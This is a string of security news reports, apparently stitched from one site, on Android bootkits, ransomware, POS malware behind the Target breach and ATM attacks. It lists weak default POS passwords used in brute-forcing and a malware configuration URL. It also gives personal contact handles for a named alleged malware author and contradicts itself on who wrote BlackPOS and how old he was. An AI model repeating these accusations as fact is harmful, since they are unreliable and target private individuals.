A Russian security firm 'Doctor Web' identified the first mass distributed Android bootkit malware called 'Android.Oldboot', a piece of malware that's designed to re-infect devices after reboot, even if you delete all working components of it. The bootkit Android.Oldboot has infected more than 350,000 android users in China, Spain, Italy, Germany, Russia, Brazil, the USA and some Southeast Asian countries. China seems to a mass victim of this kind of malware having a 92 % share. A Bootkit is a rootkit malware variant which infects the device at start-up and may encrypt disk or steal data, remove the application, open connection for Command and controller. A very unique technique is being used to inject this Trojan into an Android system where an attacker places a component of it into the boot partition of the file system and modify the 'init' script (initialize the operating system) to re-load the malware as you switch on your android. When you start your device, this script loads the Trojan 'imei_chk' (detects it as Android.Oldboot.1) which extract two files libgooglekernel.so (Android.Oldboot.2) and GoogleKernel.apk (Android.Oldboot.1.origin), copy them respectively in /system/lib and /system/app. Android.Oldboot acts as a system service and connects to the command-and-controller server using libgooglekernel.so library and receives commands to download, remove installed apps, and install malicious apps. Since it becomes a part of the boot partition, formatting the device will not solve the problem. The researchers believe that the devices somehow had the malware pre-loaded at the time of shipping from the manufacturer, or was likely distributed inside modified Android firmware. So, users should beware of certain modified Android firmware. Two weeks ago, Some Chinese Security Researchers have also detected a bootkit called 'Oldboot', possibly the same malware or another variant of it. \"Due to the special RAM disk feature of Android devices’ boot partition, all current mobile antivirus products in the world can’t completely remove this Trojan or effectively repair the system.\" \"According to our statistics, as of today, there’re more than 500, 000 Android devices infected by this bootkit in China in last six months. The Android malware Android.Oldboot is almost impossible to remove, not even with formatting your device. But if your device is not from a Chinese manufacturer, then chances that you are a victim of it, are very less. This bootkit is not the first of this kind. Two years back, in the month of March we reported, NQ Mobile Security Research Center uncovered the world's first Android bootkit malware called 'DKFBootKit', that replaces certain boot processes and can begin running even before the system is completely booted up. But Android.Oldboot malware is a bit more dangerous because even if you remove all working components of it from your android successfully, the component imei_chk will persist in a protected boot memory area and hence will reinstall itself on next boot and continuously infect the Smartphone. Users are recommended to install apps from authorized stores such as Google Play, disable installation of apps from ‘Unknown Sources’ and for a better security install a reputed security application. You can also try to re-flash your device with its original ROM. After flashing, the bootkit will be removed." }

The Antivirus firm AVAST spotted a malicious version of the open source FTP (File Transfer Protocol) software 'FileZilla' out in the wild. The software is open source, but has been modified by the hackers that steal users' credentials, offered on various hacked sites for download with banner or text ads. Once installed, the software's appearance and functionalities are equal to the original version, so a user cannot distinguish between the fake or real one, and the malware version of the “.exe” file is just slightly smaller than the real one. \"The installed malware FTP client looks like the official version and it is fully functional! You can’t find any suspicious behavior, entries in the system registry, communication or changes in application GUI.\" The only difference is that the malware version use 2.46.3-Unicode and the official installer use v2.45-Unicode, as shown: \"We found a hardcoded connection detail stealer after deeper analysis. Malware authors abuse open source code and add their own stealer function to the main code.\" The modified version copies the login information of the user and sends it to a server that is apparently in Germany, and same IP address of the server hosts three other domains, which are also associated with malware and spam activities. \"Login details are sent to attackers from the ongoing FTP connection only once. Malware doesn't search bookmarks or send any other files or saved connections,\" Avast explains. This malicious version has been compiled way back in September 2012, and is still detected by just a couple of Antivirus solutions. In the past, Cyber Criminals also used Google Adsense to promote malicious software or the modified open source softwares.

If infected by such malware, to be very honest, there is no hope for recovering your documents without paying a ransom amount to the cyber criminals. Online users are now facing another similar ransomware called 'CryptorBit', (Virustotal report) first spotted on September 2013. It is not a variant of Cryptolocker but it does exactly the same thing i.e. Encrypt all the files on the Hard Disk. CryptorBit is an infection that activates by clicking links in a spam message or malicious email, or websites while browsing the web, or by opening an attachment in an email from a malicious source. Once your system gets infected by the CryptorBit, it will encrypt your files and hold them until a ransom of $50 - $500 or more is not paid. It will display a warning for you i.e. “YOUR PERSONAL FILES ARE ENCYPTED”, following a warning message i.e. \"All files including video, photos and documents, etc. on your computer are encrypted\". The affected file types include Word files, Excel files, Pictures, Music, Movies, Quickbooks files, PDFs and all other data files on your system. The Warning note on the screen instructs the victim to download the Tor browser and access an onion-based hidden website for paying the ransom money. In addition, it may threaten you to pay the ransom within 24 hours. Otherwise, it will damage all of your personal and system files completely. SCAM-WARE CryptorBit Malware is totally a scam designed by cyber criminals, because even after paying the ransom amount it will not decrypt your files, sounds scary but it’s true. It forces users to pay for the fake private key to decrypt files. CryptorBit not even fraud your money but also cause damage to your PC and Interfere with your privacy. The most common windows folder location where the Cryptorbit virus lives - \"%AppData%\" and can be easily removed using Antivirus tools; but unlike traditional Ransomware, you can decrypt your files using system utility 'System Restore'. The spam emails may appear to be sent from people you know, so it’s very important for users to be careful while reading such malicious emails and if it doesn’t look right, it’s probably not. The best protection against these infections is a good backup. We strongly advise people to keep their important files on their servers, and not on their desktops or local folders." }

But it should not be forgotten by us that 2014 marks the 10th Anniversary of the World’s First mobile malware. FortiGuard Labs has published a whitepaper that briefly explains the major mobile threats from 'Cabir' to 'FakeDefend' over the last decade. The world’s first mobile malware was 'Cabir', detected in 2004 when mobiles were not so popular among all of us. It was developed by the group of hackers known as 29A, designed to infect the Nokia Series 60, the most popular Smartphone platform with tens of millions users worldwide at that time. The name “Caribe” appears on the screen of the infected phones and the worm spreads itself by seeking other devices such as phones, printers, game consoles which are within the Bluetooth connectivity of that phone. The virus had been detected in more than 20 different countries, including the U.S., China, Russia and Finland, where Nokia is headquartered. The malicious software has destroyed files that forced phones to dial expensive 900 numbers or 911, and made them crumble under denial-of-service attacks, in which the device gets so much inbound traffic that it can't function properly. At that time, the cyber criminals were simply molding the Bluetooth capabilities and finding out new tactics to infect mobile devices. A year later, some new variants of the 'Cabir' mobile virus were detected, called Mabir and CommWorrior that had ability to spread itself by Bluetooth as well as MMS, propagating itself via MMS service to all contacts contained in the infected phone. Thereafter, in 2006, RedBrowser hits the market beating all the previous ones by infecting phones via the universally supported Java 2 Micro Edition (J2ME) platform, allowing the Trojan to target a larger audience, regardless of the phone's manufacturer or operating system and to leverage premium rate SMS services that charged the phone’s owner approximately $5 per SMS. The years passed on with the formation of major mobile malware that marked its existence in mobile malware history. 2004: The First Attempt! 2005: Adding MMS To the Mix 2006: Following the Money 2007-2008: A Period of Transition 2009: The Introduction of the Mobile Botnet 2010: The Industrial Age Of Mobile Malware 2011: Android, Android and Even More Android! 2013: Game On – New Modes of Attack In 2013, Fortinet’s FortiGuard Labs saw more than 1,300 new malicious applications per day and is currently tracking over 300 Android malware families and over 400k malicious Android applications. According to Juniper Networks' annual Mobile Threat Report, mobile malware grew by 614 percent from March 2012 to March 2013. This equates to 276,259 troublesome apps and vulnerabilities. Now, after the arrival of large number of Mobile Platforms that are becoming smarter by the time, the landscape of mobile threats have changed dramatically and cyber criminals are trying more sophisticated ways with the only soul purpose of making money.

Reuters reported Israeli Defense is the latest illustrious victim of the Spear Phishing Attack, and hackers penetrated into an Israeli defense ministry computer using a malicious email as a vector. Aviv Raff, Chief Technology officer at Seculert, confirmed that an Email with a malicious attachment that looked like it had been sent by the country’s Shin Bet Secret Security Service. The attackers have penetrated into the network of Israeli Defense accessing to 15 computers, one of them managed by the Israel’s Civil Administration that monitors Palestinians in Israeli-occupied territory. The Civil Administration is a unit of Israel’s Defense Ministry that control the passage of goods between Israel and the West Bank and Gaza Strip. It is clear that the information contained in the infected system represents a precious target for someone that intend to examine what and who is authorized to pass through the territories contested by Israelis and Palestinians. The office also manages entry permits to Palestinians who work in Israel, and this could be another motivation for the attack. The earliest evidence confirmed the attack was conducted by Palestinians hackers, because there are many similarities with a precedent attack against Israeli systems conduced more than a year ago from a server in the Hamas-ruled Gaza Strip. Aviv Raff revealed that the 15 computers were controlled by the hackers for several days after the January 15, when the malicious email was sent with an attachment about ex-Israeli prime minister Ariel Sharon who had just died. The message text anticipates the content of the attached .zip file that claims to contain reports and photos of the attack. According Trend Micro firm the initial target of that attack was the Israeli Customs agency. In fact the file attached to the email hides a known malware, the XtremeRat trojan, which was largely used in surveillance campaigns by many regimes such as Syrian government. Guy Inbar, a spokesman for the Civil Administration said: “We are not commenting on it, we don’t respond to such reports,” Let me add, These is not a sufficient proof, but we all know that how much complicated is the attribution for an attack in the cyberspace, and many political actors could be interested to fuel the crisis between the two populations. Anyway security experts recognized the same hand behind the latest attack originated from a server in the US, the tactics adopted by hackers is identical and there are many similarities in the code used. According to Securlet, the attackers have used ”Xtreme RAT“ for a cyber espionage campaign against Israeli institutions and law enforcement in Novemeber 2012, forcing the government to shut down Internet access for its police. This cause prohibiting the use of memory sticks and mobile storage to avoid the diffusion of the malicious agent. If the news is confirmed, it is very concerning. Let’s consider that the attack discovered could be just an initial part of a large operation targeting sub-contractors to hit Israel, because it is very common that hackers target subcontractors to hit big enterprises and government offices due to the poor level of security they often offer. Securlert hasn’t discovered what the hackers did after accessing to the system, it is not clear if the attackers have stolen some document or they have tried to manipulate some data. “All we know is at least one computer at the Civil Administration was in control of the attackers; what they did we don’t know.” said Raff said. The incident is just the tip of the iceberg, has confirmed by media hacking activity in the Middle East is very intense, foreign governments and group of hacktivists like Anonymous have targeted the military, government offices, private companies and critical infrastructure." }

They also announced that it is working closely with federal law enforcement and is conducting an investigation with the help of third-party data security experts to establish the facts. \"Michaels said in its statement that it had \"recently learned of possible fraudulent activity on some US payment cards that had been used at Michaels, suggesting that the company may have experienced a data security attack\" company said. CEO Chuck Rubin said that the company has not confirmed a breach, but wanted to alert customers: We are concerned there may have been a data security attack on Michaels that may have affected our customers’ payment card information and we are taking aggressive action to determine the nature and scope of the issue. Michaels gave no additional information on the possible breach. At the time of writing, it was not known that how many customers may be involved and the possible breach affected online or in-store shoppers. Michaels, a 37 year old chain with 1259 stores had revenue more than $4 Billion in 2012, and this is not the first time when the company has faced a data breach. In 2011, about 94,000 payment card numbers were stolen from approx 80 stores. Michaels is the third major targeted retailer in the past month. In December, the attack on Target affected as many as 110 million customers, including 40 million credit and debit card and Neiman Marcus said a 3 month breach in the summer affected its 1.1 million customers. The FBI has sent a three-page confidential memo to retailers and warned them to get prepared for more attacks involving “memory-parsing” malware that lives on point of sale registers (POS), which includes card-swiping machines and cash registers. This memory-parsing malware is also referred to as a RAM scraper. The FBI mentions one particular variant of this malware, apparently called Alina, available at $6000 on underground forums. If Michaels confirms a breach, it would become the latest victim in a string of data attacks rattling merchants across the U.S. Meanwhile, clients have been recommended to check their payment card account statements for unauthorized charges." }

A malware expert at the Kaspersky Lab revealed a large-scale spamming campaign, advertising a fake PC version of the WhatsApp, to spread a banking trojan. According to the report, unaware users have received an email written in Portuguese language, it also tries to deceive the recipient with a social engineering tactic in which cyber criminals composed the malicious email informing that victims already have 11 pending friend invitations. If users click on the “Baixar Agora” (Download Now) link in the spam email, they will be redirected to a Hightail.com URL to download the Trojan. Hightail is a cloud storage service, the malicious component deployed on it then downloads the malware via a server in Brazil. The file stored on Hightail server looks like a 64-bit installation file bundled with 2.5 megabyte MP3 file. According to Virus Total engine, only 3 out of 49 anti-malware softwares are able to detect it. “This Downloader has some anti-debugging features like: UnhandledExceptionFilter() and RaiseException() and once running, it downloads a new Trojan that is banker itself. This time the malware comes from a server in Brazil and has a low VT detection 3 of 49. The recently downloaded banker has the icon of an mp3 file. Most users would click on it, especially after seeing it is about 2.5MB in its weight.” During execution of the malicious code, it communicates with the command & control servers to provide infection statistics and system console through the local port 1157. The Malware sends back the stolen information in the Oracle DB format. The malicious code is also able to download another payload on the infected system. There are some interesting consideration to do: The technique used by the attacker could result very effective in areas where the application is mostly used i.e. Latin America and Europe. The WhatsApp has more than 430 million users and 30 million added in just the last month. Researchers identified a “classic style of a Brazilian-created malware” pattern, the malicious agent targeted Brazilian population much inclined to the use of WhatsApp. The language used and the fact that the Trojan is downloaded from a Brazilian server confirm the hypothesis. This isn’t the first spam email campaign that abused the WhatsApp brand, cyber criminals leveraged the service in the past November to push malware via email by tricking users into thinking they had a new voicemail message.

I am quite sure that you must be syncing your Smartphone with your PCs for transferring files and generating backup of your device. If your system is running a windows operating system, then it’s a bad news for you. Researchers have discovered a new piece of windows malware that attempts to install mobile banking malware on Android devices while syncing. Last year in the month of February, Kaspersky Lab revealed an Android malware that could infect your computer when connected to Smartphone or tablets. Recently, Researchers at Symantec antivirus firm discovered another interesting windows malware called ‘Trojan.Droidpak’, that drops a malicious DLL in the computer system and then downloads a configuration file from the following remote server: http://xia2.dy[REMOVED]s-web.com/iconfig.txt The Windows Trojan then parses this configuration file and download a malicious APK (an Android application) from the following location on the infected computer. %Windir%\\CrainingApkConfig\\AV-cdk.apk To communicate with the mobile device a command line tool Android Debug Bridge (ADB) is required, that allows the malware to execute commands on Android devices connected to the infected computer. ADB is a legitimate tool and part of the official Android software development kit (SDK). In the next step, the trojan downloads all the necessary tools including Android Debug Bridge and the moment you connect an android device having USB debugging Mode enabled, it initiates the installation process and repeats it until it ensure that the connected device has been infected and install an app that will appear as a fake Google App Store. Such Windows Malware is first of its own kind, since attackers prefer to use the social engineering techniques to spread their fake malicious apps hosted on third-party app stores.

BlackPOS also known as \"reedum\" or 'Kaptoxa' is an effective crimeware kit, used in the massive heist of possibly 110 million consumers' Credit-Debit cards, and personal information from the TARGET. Later Researchers's investigation revealed that the original coder of BlackPOS Malware was actually a 23-year-old young hacker named Rinat Shabayev and the teen, Sergey Taraspov is the incharge for the technical support department. In an interview with Russian channel 'LifeNews', Rinat Shabayev admitted that he had developed the BlackPOS crimeware kit. He clarified that the program developed by him was not meant for any kind of data theft, instead the program was written for the security testing. He developed the malware with the help of another programmer with anonymous identity, whom he had met online. His original plan was just to sell the exploit, not to use it for malicious intent by himself. His friend took the readymate codes from him and added more features to it. In addition to this information, he also confessed that the exploit can be used for malicious purposes too. Researchers at IntelCrawler say that the same malware may have also been involved in the Neiman Marcus attack too. Whatever be the intention of the programmer, but now more than 110 million people are suffering credit card theft because of his software. Even after knowing that the malware has ability to compile a massive financial theft, his justifications are not enough to be innocent." }

In an effort to takedown of the Sefnit botnet to protect windows users, Microsoft remotely removes the older versions of installed Tor Browser software and infection from 2 Million systems, even without the knowledge of the system's owner. Last year in August, after Snowden revelations about the National Security Agency's (NSA) Spying programs, the Internet users were under fear of being spied. During the same time Tor Project leaders noticed almost 600% increase in the number of users over the anonymizing networks of Tor i.e. More than 600,000 users join Tor within few weeks. In September, researchers identified the major reason of increased Tor users i.e. A Tor-based botnet called 'Sefnit malware', which was infecting millions of computers for click fraud and bitcoin mining. To achieve the maximum number of infections, cyber criminals were using several ways to spread their botnet. On later investigation, Microsoft discovered some popular softwares like Browser Protector and FileScout, bundled with vulnerable version of Tor Browser & Sefnit components. 'The security problem lies in the fact that during a Sefnit component infection, the Tor client service is also silently installed in the background. Even after Sefnit is removed, unless specific care is taken, the Tor service will be left and still regularly connect to the Tor Network.' It was not practically possible for Microsoft or the Government to instruct each individual on 'How to remove this Malware', so finally Microsoft took the decision of remotely washing out the infections themselves. To clean infected machines, Microsoft began updating definitions for its antimalware apps. \"We modified our signatures to remove the Sefnit-added Tor client service. Signature and remediation are included in all Microsoft security software, including Microsoft Security Essentials, Windows Defender on Windows 8, Microsoft Safety Scanner, Microsoft System Center Endpoint Protection, and Windows Defender Offline.\" and later also in Malicious Software Removal Tool. But why Tor Browser? \"Even after Sefnit is removed, unless specific care is taken, the Tor service will be left and still regularly connect to the Tor Network. This is a problem not only for the workload it applies to the Tor Network, but also for the security of these computers.\" Microsoft says. So they removed it and to Justify their action, Microsoft points out several vulnerabilities in the Tor version bundled with Sefnit malware i.e. Tor version 0.2.3.25, that opens the user to attack through these known vulnerabilities. \"Tor is a good application used to anonymous traffic and usually poses no threat. Unfortunately, the version installed by Sefnit is v0.2.3.25 – and does not self-update. The latest Tor release builds at the time of writing is v0.2.4.20.\" May be this is the right way to neutralize the infections, but the Microsoft's action also clarifies the capability to remotely remove any software from your computer. Nicholas J. Hopper from University of Minnesota, provided a detailed explanation about 'Protecting Tor from botnet abuse in the long term' in a paper." }

As we have reported a few days before that the Intelligence firm IntelCrawler has identified a 17 year old teenager, known as “Ree [4]” in the underground market, as the author of the BlackPOS/Kaptoxa malware used in the attack against Target and Neiman Marcus retailers. The teenager is not directly responsible for the Target attack, but he sold the BlackPOS to other Cyber Gangs, including the admin’s of underground credit cards market places, \".rescator\", \"Track2.name\", \"Privateservices.biz\" and many others were his clients. Who is Ree[4]?IntelCrawler exposed REE[4]'s original profile as Sergey Taraspov, a 17 year old Russian programmer, based in St.Petersburg and Nizhniy Novgorod (Russian Federation). Before both breaches IntelCrawler detected large-scale RDP brute-forcing attacks on Point-of-Sales terminals across the US, Australia and Canada started at the beginning of 2013 year in winter period with weak passwords such as:\"pos\":\"pos\"; \"micros\":\"micros\" (MICROS Systems, Inc. - Point-of-Sale Hardware); \"edc\":\"123456\" (EDC - Electronic Draft Capture).After the last report from 'IntelCrawler' team, we have noticed the reaction from few security researchers, making doubts about the investigation and details about Ree[4]'s profile. Today we have another exclusive update and more evidences from Security researchers at IntelCrawler on the author of BlackPOS. The author of BlackPOS is the bad actor with nickname \"ree4\" or \"ree[4]\", he started to sell this malware on one of underground forums called \"Exploit.in\", as the following screenshot suggests:Despite the author of BlackPOS malware is a cyber expert, it seems that he has ignored the power of social networking platform, and the possibility to use them for OSINT (Open-source intelligence) purposes. Popular Russian Social networking website called 'VKontakte' has a profile with the same nickname as BlackPOS's author. Obviously this is not a body of evidence. To collect more evidences, the researchers at IntelCrawler noted that one of the interest mentioned on that profile is \"coding\", and they have also matched the email address of the profile through password recovery option by email:According to operative information from IntelCrawler, the person behind the nickname \"ree[4]\" is Rinat Shibaev, working closely with Sergey Taraspov, who was acting as his technical support, having roots in St.Petersburg (Russian Federation), very well known coder of malicious code in the underground community.

Cloud services are designed in such a way that it is easy to maintain, use, configure and can be scaled depending upon the requirement of the service being provided using the CLOUD technology with cost effective manner. Due to the Easy and Cost effective alternative of traditional computing, Malware writers are using the big cloud hosting platforms to quickly and effectively serve malware to Internet users, allowing them to bypass detection and geographic blacklisting by serving from a trusted provider. Hiding behind trusted domains and names is not something new. According to recently published SERT Q4 2013 Threat Intelligence Report, the malware distributors are using Cloud Services from Amazon, GoDaddy and Google like a legitimate customer, allowing them to infect millions of computers and vast numbers of enterprise systems. The Cloud-based hosting services let malware distributors to avoid the detection because repeatedly changes IP addresses and domain names to avoid detection. Amazon and GoDaddy were identified as the top malware-hosting providers, with a 16 percent and a 14 percent share, respectively.Major Additional findings include:United States hosts 4.6 times more malware than the next leading country. 58% of malicious files obtained were identified as HTML files, 26% were directly executable. Many malware developers and distributors are utilizing social engineering tactics, including the use of trusted keywords and services, to evade detection and increase potential infection counts. A single malicious domain was spread across 20 countries, 67 providers and 199 unique IPs evade detection. The SERT Research team collected a large number of samples from more than 12,000 Registrars, 22,000 ISPs (Internet Service Providers) and tested all malicious packages with more than 40 antivirus engines, output of which is concluded below: The majority of the top malware sites is domains commonly associated with the Potentially Unwanted Applications (PUA), more commonly known as adware, type of malware distributions. \"Researchers found that a significant portion of the malware sampled consisted of Microsoft Windows 32-bit Portable Executable (PE32) files being used to distribute pay-per-install applications known as potentially unwanted applications (PUAs).\"The report claimed that these malware is undetectable from over 40 anti-virus engines, that can act as a gateway for exploits and more than half of malware found being distributed by HTML web pages." }

Ads are a legitimate way to monetize. However, creating and spreading a fresh add-on to get a large user base is always tough, but now adware companies found a new trick i.e. Buying trusted browser extensions with a large user-base and exploiting their auto-update status to push out adware. Recently, the developer of ‘Add to Feedly’ Chrome extension with 30,000+ users, Amit Agarwal, was approached by some mysterious buyers. “It was a 4-figure offer for something that had taken an hour to create and I agreed to the deal,” he said.\"I transferred the ownership of the extension to a particular Google Account.

Target confirmed last weekend that a malicious software was embedded in point-of-sale (POS) equipment at its checkout counters to collect secure data as the credit cards were swiped during transactions. The Malware called 'BlackPOS' also known as \"reedum\" or 'Kaptoxa' is an effective crimeware kit, that was created in March 2013 and available in underground sites for $1800-$2000. Investigators from IntelCrawler found a 17-years old hacker who actually developed the BlackPOS crimeware kit. His nickname is 'ree4' and original name: 'Sergey Taraspov' from St.Petersburg and Nizhniy Novgorod (Russian Federation). IntelCrawler's sources mentioned that the BlackPOS malware was created in March 2013 and first infected the Point-of-Sales environments in Australia, Canada and the US. Alleged Russian hacker and malware developer Sergey Taraspov (ree4) sold more than 40 builds of BlackPOS to cybercriminals from Eastern Europe and other countries. BlackPOS is a RAM-scraping malware totally written in VBScript i.e. It copies credit-card numbers from point-of-sale machines' RAM, in the instant after the cards are swiped and before the numbers are encrypted. In December, after the TARGET data breach, the Symantec antivirus firm discovered the malware and dubbed as 'Infostealer.Reedum.C'.'He is a very well known programmer of malicious code in underground and previously he has created several tools used in hacking community for brute force attacks, such as \"Ree4 mail brute\", and also earned some first money with social networks accounts hacking and DDoS attacks trainings, as well as software development including malicious code.'More details about Sergey Taraspov (ree4): E-mail 1: ree4@list.ru E-mail 2: ree4@yandex.ru ICQ: 565033 Skype: s.r.a.ree4 Now any of his toolkit buyer is possibly the culprit behind the Target data breach.

One of them is Primecoin (sign: Ψ; code: XPM), a peer-to-peer open source cryptocurrency that implements a scientific computing proof-of-work system. Unlike Bitcoin or other virtual currencies, only Primecoin provides a proof of work that has intrinsic value. It generates a special form of prime number chains, known as ‘Cunningham chains & bi-twin chains’ and has a real world importance in mathematical research. Worldwide famous RSA Encryption basically uses two prime numbers for generating a RSA key pair. If you are able to factorize the public key and find these prime numbers, you will then be able to find the private key. Thus, the whole Security of RSA encryption is based on the length of prime numbers. So, Primecoin plays a great role for crypto researchers to get large... and a very large number of Primes. Like other cryptocurrency miners, Primecoin miners are also available and in simple terms, just put your computer to work to find prime numbers chain and make money. After Bitcoin, the increasing public attention of other cryptocurrency did not go unnoticed by the Cyber criminals who have begun unleashing Primecoin mining malware. Mehrdad Yazdizadeh, a security researcher from antivirus firm 'Panda Security' told The Hacker News that he has found few malicious Primecoin miners available on the Internet for Download from some Chinese websites and Torrents. \"Primecoin miners are written in python and other scripting languages are using a variety of methods to infect the users' systems i.e. Brute-forcing, privilege escalation, modify SQL tables\". He said. Those infected systems can be used as a botnet network to perform further attacks. Another interesting feature of this malware is the ability to host SQL server through XP_cmdshell of MSSQL. \"On execution, the malware will inject the SQL server to cmd.exe, svchost.exe, explorer.exe and similar process to hide itself as rootkits\" he added.Users affected by this malware will experience abnormally high CPU usage on their computers as a result of the infection. Further analyses showed that the malware creates a process that call “sqlservr.exe”, pointing to another file i.e. “primecoin.conf”, which contains the credential and the IP address of the malware's master to communicate. \"Even if a user will delete sqlservr.exe or the conf folder, it will recover itself again and again.

Thousands of Road Accidents have occurred because of Mobile usage during driving, but now we have Mobile based Cars, so the security of the driver will now depend upon the smartness of the applications installed. The car's Android system can be hacked if it's linked to the owner's Smartphone. There will be no doubt if we will see something like \"Rooting your Cars\" soon. Also Malware is another factor that can pose a serious security issue to life. According to various threat reports, Android is the majorly vulnerable to hackers and malware because of its own weak architecture. Also, it is already proven that an android device can be converted into a Spying bug using a simple malicious application, that can record the surrounding conversation via microphone to upload it to the hacker's server. Another Major concern is that, Google is a U.S based Company and all FISA Secret orders are again applied on this project too. Will Google be able to stop National Security Agency (NSA) for backdooring our privacy and Security while driving. So, Google should consider applying all available Security & Privacy measures on these future' Smart Cars to defend against cyber attacks and NSA." }

Cryptolocker, which strongly encrypts victims' hard drives until a ransom is paid, is now again back in action to haunt your digital life with an additional feature. Until now, CryptoLocker has been spread via spam email, with victims tempted to download an attachment or click on a link to a malicious website, but now it can spread itself as a worm through removable USB drives. Security Researchers at Trend Micro have recently reported a new variant of Cryptolocker which is capable of spreading through removable USB drives. As Previously reported by our Security experts at The Hacker News, Cryptolocker is a malware which locks your files and demand a ransom to release it. The files are encrypted so removing the malware from the system doesn’t unlock your files. The only way to get your files decrypted is to pay a demanded ransom amount to the criminals. This new cryptolocker’s version is detected as WORM_CRILOCK. A, and can infect the computers by posing as key generator or activators for paid software like Adobe Photoshop, Microsoft Office on Torrent websites. If CryptoLocker has already encrypted your files, then it will display a message demanding payment. Once installed on a system, it can replicate itself onto a USB drive and spread further and also if that infected system is connected to a network, the Cryptolocker work can look for other connected drives to infect them as well. Other malware has employed similar tactics in the past, but CryptoLocker's encryption is much more secure and is currently not possible to crack. But the new Cryptolocker didn’t use DGA (domain generation algorithm), but instead relied on hardcoded command & control center details.Further analysis of WORM_CRILOCK reveals that it has a stark difference compared to previous variants. The malware has foregone domain generation algorithm (DGA). Instead, its command-and-control (C&C) servers are hardcoded into the malware. Hardcoding the URLs makes it easier to detect and block the related malicious URLs. DGA, on the other hand, may allow cybercriminals to evade detection as it uses a large number of potential domains. This could mean that the malware is still in the process of being refined and improved upon. Thus, we can expect latter variants to have the DGA capability.Recommendations for users to defend against such threats:Users should avoid using P2P i.e. Torrent sites to get pirated copies of software and stick with official or reputable sites. Users should also be extremely careful about plugging USB drives into their computers. If you found one lying around, don't plug it in to see what may be on it." }

After the exposure of the large number of surveillance scandals including PRISM, DROPOUTJEEP, XKeyscore and many many more which are now publicly known as well as unknown, Will NSA ever stop Privacy breach? Obviously 'NO'. That I can predict from another Snowden leak published by the Washington Post news website recently i.e. US National Security Agency (NSA) is trying to develop a futuristic super computer called 'Quantum computer' that could be capable of breaking almost every kind of encryption on the computer used to protect banks, medical, business including top-secret information held by government around the world. The Project is specified as “Penetrating Hard Targets” in the document and is a part of $79.7 million research program. The Washington Post says that the research is being done at the University of Maryland's Laboratory for Physical Sciences. The goal of creating a working quantum computer is to boost encryption cracking capabilities against world's strongest encryption i.e. RSA - commonly used in Web browsers for encrypted emails and secure financial transactions. RT News reports:The basic principle in quantum computing is “quantum superposition,” or the idea that an object simultaneously exists in all states. A classic computer uses binary bits, or zeroes and ones. A quantum computer uses quantum bits, or qubits, that are simultaneously zero and one. While a classic computer must do one calculation at a time, a quantum computer can achieve a correct answer much faster and efficiently through parallel processing, with no need to run those calculations.The progress of the NSA's Project on such computer is not known, but Snowden’s documents suggested that the agency is no closer to building a quantum computer and it is difficult to attain because of the fragile nature of such computers. His disclosures not only threatened the whole world but also surprised his own citizens who have the thing called the Constitution and in that constitution has a 'Bill of rights', one of which is the 4th amendment says:The right of the people to be secure in their persons, houses, papers, and effects, against unreasonable searches and seizures, shall not be violated, and no Warrants shall issue, but upon probable cause, supported by Oath or affirmation, and particularly describing the place to be searched, and the persons or things to be seized.Now when the IT World is facing massive security breaches like Target, Adobe, Linkedin, Snapchat due to the lack of good encryption practices and Malware threats like Cryptolocker - due to the strongest encryption, but the NSA is doing NOTHING to defend people against such threats. I suppose the dedication of NSA to save the world and to developing the strongest encryptions, rather they are ruining the user' privacy and security community by targeting encryption, tapping telephones, accessing email, hacking iPhone etc. At the same time such activities by National Security Agencies are also motivating the cyber criminals to do the same.

Ransomware malware was mostly known by the people when Cryptolocker comes into play. At the time when readers were getting aware of ransomware, Cryptolocker threat had touched the peak and other money motivated cyber criminals have started developing their own Cryptolocker versions. Two hackers going by the name of 'gyx' and 'Porphyry' (admin of maldev.net hacking forum) are advertizing a new ramsomware malware tool-kit called \"Prison Locker\" on various hacking forums with tutorials. They have developed the Prison Locker a.k.a Power Locker ramsomware toolkit in C/C++ programming language, proving a GUI version with customizable features for customers. The Ransomware is using BlowFish encryption to encrypt all available files on the victim's hard disk and shared drives except .exe, .dll, .sys, other system files. During encryption it will generate unique BlowFish key for each file and then encrypts the keys further with RSA-2048 encryption and will send victim's system information back to the command-and-control center of the attacker.As the developer mention in a Pastebin post, the Command-and-control center allows an attacker to set the ramsomware warning time duration, ransom amount, payment mode and also allow decrypting the files on the victim system after payment received. The addition features added to Prison Locker:The malware is able to detect Virtual Machine, Sandbox mode, and debugging environments. It will also disable Windows key & Escape key to prevent unwanted user actions. Also can kill taskmgr.exe, regedit.exe, cmd.exe, explorer.exe, and msconfig.exe processes to prevent unwanted user actions. Malware can startup in both regular boot mode and safe boot under HKCU. A Malware Research Group is following the development of this new Malware threat and has published his investigation report on his blog i.e. MalwareMustDie. He has investigated the identity of the Ransomware developers at his own level, could be a free tip for Law Enforcement agencies too.

If you don’t take proper precautions, you may lose the information stored on your computer. The people who are calling themselves Cyber Security Researchers whose work is to protect others from such threats are now self participating in the Cyber Crimes just for the monetary purpose. As mentioned earlier that the NSA is spying over Non-American people i.e. Foreigners. But now it’s the high time to think that what about the cyber criminals who are operating from the USA, could be the mastermind behind major Bitcoins thefts, banking Trojans, exploit kits, Cryptolocker..

Most of the world’s ATMs are running on Windows XP operating system, which is highly vulnerable to Malware attacks. Just like your Desktop Laptops, some ATMs also have USB sockets, which is hidden behind the ATM’s fascia. The German security researchers who discovered the hack detailed their findings at the Chaos Computing Congress in Hamburg, Germany recently. They said that the thieves cut holes in the fascia to access a USB port and then uploaded malware to the machines.The malware creates a backdoor that can be accessed on the front panel. \"These researchers explained that the malware allowed the thieves to create a unique interface on the ATMs by typing in a 12-digit code. This interface allowed for withdrawal and also showed the criminals the amount of money and each bill denomination inside the machines. This meant the thieves could save time by only taking the highest value bills.\" Dara Kerr from CNET news reported.Once the thieves finished their theft at a cash machine, they would patch up the hole to allow the same exploit to be used on other machines. This indicates that the criminal crew is highly familiar with the ATMs mechanism. The malware does not appear to harvest customer PINs or other sensitive data and now some banks have upgraded their ATMs to prevent them from booting from external USB drives." }

